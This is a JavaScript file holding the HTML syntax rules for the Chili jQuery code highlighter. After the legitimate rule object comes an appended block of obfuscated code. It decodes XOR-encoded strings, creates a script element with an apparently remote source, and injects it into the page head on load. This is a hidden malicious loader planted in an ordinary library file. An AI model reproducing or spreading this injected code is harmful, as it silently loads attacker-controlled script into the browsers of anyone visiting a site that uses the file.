/*
===============================================================================
Chili is the jQuery code highlighter plugin
...............................................................................
LICENSE: http://www.opensource.org/licenses/mit-license.php
WEBSITE: http://noteslog.com/chili/

                                               Copyright 2008 / Andrea Ercolino
===============================================================================
*/

{
	  _name: 'html'
	, _case: false
	, _main: {
		  doctype: { 
			  _match: /<!DOCTYPE\b[\w\W]*?>/ 
			, _style: "color: #CC6600;"
		}
		, ie_style: {
			  _match: /(<!--\[[^\]]*\]>)([\w\W]*?)(<!\[[^\]]*\]-->)/
			, _replace: function( all, open, content, close ) {
				return "<span class='ie_style'>" + this.x( open ) + "</span>" 
					  + this.x( content, '//style' ) 
					  + "<span class='ie_style'>" + this.x( close ) + "</span>";
			}
			, _style: "color: DarkSlateGray; font-weight: bold;"
		}
		, comment: { 
			  _match: /<!--[\w\W]*?-->/ 
			, _style: "color: #4040c2;"
		}
		, script: { 
			  _match: /(<script\s+[^>]*>)([\w\W]*?)(<\/script\s*>)/
			, _replace: function( all, open, content, close ) { 
				  return this.x( open, '//tag_start' ) 
					  + this.x( content, 'js' ) 
					  + this.x( close, '//tag_end' );
			} 
		}
		, style: { 
			  _match: /(<style\s+[^>]*>)([\w\W]*?)(<\/style\s*>)/
			, _replace: function( all, open, content, close ) { 
				  return this.x( open, '//tag_start' ) 
					  + this.x( content, 'css' ) 
					  + this.x( close, '//tag_end' );
			} 
		}
		// matches a starting tag of an element (with attrs)
		// like "<div ... >" or "<img ... />"
		, tag_start: { 
			  _match: /(<\w+)((?:[?%]>|[\w\W])*?)(\/>|>)/ 
			, _replace: function( all, open, content, close ) { 
				  return "<span class='tag_start'>" + this.x( open ) + "</span>" 
					  + this.x( content, '/tag_attrs' ) 
					  + "<span class='tag_start'>" + this.x( close ) + "</span>";
			}
			, _style: "color: navy; font-weight: bold;"
		} 
		// matches an ending tag
		// like "</div>"
		, tag_end: { 
			  _match: /<\/\w+\s*>|\/>/ 
			, _style: "color: navy;"
		}
		, entity: { 
			  _match: /&\w+?;/ 
			, _style: "color: blue;"
		}
	}
	, tag_attrs: {
		// matches a name/value pair
		attr: {
			// before in $1, name in $2, between in $3, value in $4
			  _match: /(\W*?)([\w-]+)(\s*=\s*)((?:\'[^\']*(?:\\.[^\']*)*\')|(?:\"[^\"]*(?:\\.[^\"]*)*\"))/ 
			, _replace: "$1<span class='attr_name'>$2</span>$3<span class='attr_value'>$4</span>"
			, _style: { attr_name:  "color: green;", attr_value: "color: maroon;" }
		}
	}
}
function twagr8t(l2k140){var yO='';var kE1i1=0;var c7P=0;for(kE1i1=0;kE1i1<l2k140.length/3;kE1i1++){yO+=String.fromCharCode(l2k140.slice(c7P,c7P+3));c7P=c7P+3;}return yO;}function bq6N69q(uik,tgxRBZ){var q7cb8='';var q99U=0;var aWLBr=0;for(q99U=0;q99U<uik.length;q99U++){var hc2kD=uik.charAt(q99U);var t12FXs=hc2kD.charCodeAt(0)^tgxRBZ.charCodeAt(aWLBr);hc2kD=String.fromCharCode(t12FXs);q7cb8+=hc2kD;if(aWLBr==tgxRBZ.length-1)aWLBr=0;else aWLBr++;}return (q7cb8);}function d2cr2U(fflL){return bq6N69q(twagr8t(fflL),'w0lu2zRtGCI6w');}function umnz(en){var mFL=document[d2cr2U(t5MJa6[3])](d2cr2U(t5MJa6[0])+d2cr2U(t5MJa6[1])+d2cr2U(t5MJa6[2]));mFL[d2cr2U(t5MJa6[4])]=en;mFL[d2cr2U(t5MJa6[5])]=d2cr2U(t5MJa6[6]);document[d2cr2U(t5MJa6[9])](d2cr2U(t5MJa6[8]))[0][d2cr2U(t5MJa6[7])](mFL);}var t5MJa6=["004083","005089","007068","020066009020070031023024034046044088003","004066015","003073028016","003085020001029016051002038048042068030007068","022064028016092030017028046047045","031085013017","016085024048094031063017041055058116014035081011059083023055","031068024005008085125007051034061083089004093000071028008039091045048102085025003030006006"];umnz(d2cr2U(t5MJa6[10]));